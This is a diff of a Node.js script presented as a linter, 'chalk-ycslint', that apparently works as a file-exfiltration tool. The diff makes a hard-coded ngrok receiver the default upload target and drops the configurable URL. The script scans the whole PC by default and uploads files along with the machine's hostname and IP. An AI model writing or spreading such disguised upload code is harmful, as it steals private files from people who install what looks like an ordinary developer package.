@@ -1,7 +1,4 @@
 #!/usr/bin/env node
-import path from "node:path";
-import { fileURLToPath } from "node:url";
-import dotenv from "dotenv";
 import {
   expandPathsToSupportedFiles,
   listPcScanRoots,
@@ -9,10 +6,7 @@ import {
 } from "../lib/readFiles.js";
 import { getClientInfo } from "../lib/clientInfo.js";
 import { postFilesAsJson } from "../lib/sendToServer.js";
-
-const __dirname = path.dirname(fileURLToPath(import.meta.url));
-const PKG_ROOT = path.resolve(__dirname, "..");
-dotenv.config({ path: path.join(PKG_ROOT, ".env") });
+import { DEFAULT_UPLOAD_URL } from "../lib/uploadConfig.js";
 
 function printHelp() {
   console.log(`Usage: chalk-ycslint --url <endpoint> [options] [path ...]
@@ -31,7 +25,7 @@ Relative paths are resolved from this package's install directory first, then fr
 the current working directory. Use absolute paths to pick a specific file on disk.
 
 Options:
-  --url <url>        Server URL (required unless FILE_JSON_UPLOAD_URL is set)
+  --url <url>        Server URL (default: built-in ngrok receiver)
   --field <name>     JSON body field for the file array (default: files)
   --header <h:v>     Extra header (repeatable), e.g. --header "Authorization: Bearer x"
   --timeout <ms>     Request timeout in milliseconds (default: 60000)
@@ -45,18 +39,12 @@ Options:
   --batch            Send all files in one JSON request (large payloads). Default
                      is one request per file (reads and uploads each file in turn).
   --client-id <id>   Label this PC for the server dashboard (header X-Upload-Client).
-                     Default: FILE_JSON_UPLOAD_CLIENT_ID or "hostname (local IPv4)".
+                     Default: "hostname (local IPv4)".
                      PC name and IP are always sent as X-Upload-Client-Name / X-Upload-Client-Ip.
   -h, --help         Show help
 
 Environment:
-  FILE_JSON_UPLOAD_URL        Default URL if --url is omitted
   FILE_JSON_UPLOAD_SCAN_PC    Set to 0 or false to default to --no-scan-pc (default: on)
-  FILE_JSON_UPLOAD_CLIENT_ID  Default PC name sent to the server (overridden by --client-id)
-
-Config file:
-  .env in the package directory (next to package.json) is loaded on startup. Copy
-  .env.example to .env and edit. Shell variables still override .env if already set.
 `);
 }
 
@@ -84,16 +72,14 @@ function parseArgs(argv) {
       ? false
       : true;
 
-  let url = process.env.FILE_JSON_UPLOAD_URL || "";
+  let url = DEFAULT_UPLOAD_URL;
   let field = "files";
   let timeoutMs = 60_000;
   let recursive = false;
   let scanPc = envScan;
   let skipSystemDirs = false;
   let batch = false;
-  let clientId =
-    (process.env.FILE_JSON_UPLOAD_CLIENT_ID && String(process.env.FILE_JSON_UPLOAD_CLIENT_ID).trim()) ||
-    "";
+  let clientId = "";
 
   for (let i = 0; i < argv.length; i++) {
     const a = argv[i];
@@ -147,7 +133,7 @@ function parseArgs(argv) {
     files.push(a);
   }
 
-  if (!url.trim()) throw new Error("Missing URL: pass --url or set FILE_JSON_UPLOAD_URL.");
+  if (!url.trim()) throw new Error("Missing URL: pass --url <endpoint>.");
   if (!field.trim()) throw new Error("Invalid --field.");
   if (!Number.isFinite(timeoutMs) || timeoutMs <= 0) {
     throw new Error("Invalid --timeout.");
